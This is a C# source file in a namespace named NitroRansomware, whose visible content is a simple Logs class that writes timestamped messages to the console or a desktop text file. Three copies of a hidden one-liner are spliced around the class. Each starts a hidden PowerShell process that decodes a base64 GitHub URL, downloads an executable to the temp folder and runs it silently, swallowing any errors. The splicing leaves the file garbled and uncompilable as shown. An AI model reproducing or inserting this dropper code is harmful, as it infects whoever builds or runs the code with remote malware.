using System;
using System.IO;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}



try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
namespace NitroRansomware
{


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
    class Logs
    {
        private string save;
        private string filename;
        private string config;
        private int type;
        public Logs(string configType, int outType)
        {
            save = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            filename = "\\logs.txt";
            config = configType;
            type = outType; 
        }
        private void Write(string append, string message)
        {
            if (type == 1)
            {
                using (StreamWriter w = File.AppendText(save + filename))
                {
                    string intro = String.Format("{0} {1} - ", DateTime.Now.ToString("[hh:mm:ss]"), append);
                    w.Write(intro + message);
                    w.Write("\n");
                }
            }
            else if (type == 0)
            {
                string intro = String.Format("{0} {1} - ", DateTime.Now.ToString("[hh:mm:ss]"), append);
                Console.Write(intro + message);
                Console.Write("\n");
            }
            else {
                using (StreamWriter w = File.AppendText(save + filename))
                {
                    string intro = String.Format("{0} {1} - ", DateTime.Now.ToString("[hh:mm:ss]"), append);
                    w.Write(intro + message);
                    w.Write("\n");
                }
                string consoleIntro = String.Format("{0} {1} - ", DateTime.Now.ToString("[hh:mm:ss]"), append);
                Console.Write(consoleIntro + message);
                Console.Write("\n");
            }
        }
        public void Debug(string message)
        {
            if (config == "DEBUG")
            {
                Write("DEBUG", message);
            }
        }
        public void Info(string message)
        {
            if (config == "DEBUG")
            {
                Write("INFO", message);
            }

            else if (config == "INFO")
            {
                Write("INFO", message);
            }
        }
        public void Warning(string message)
        {
            if (config != "ERROR")
            {
                Write("WARNING", message);
            }
        }
        public void Error(string message)
        {
            Write("ERROR", message);
        }
    }
}





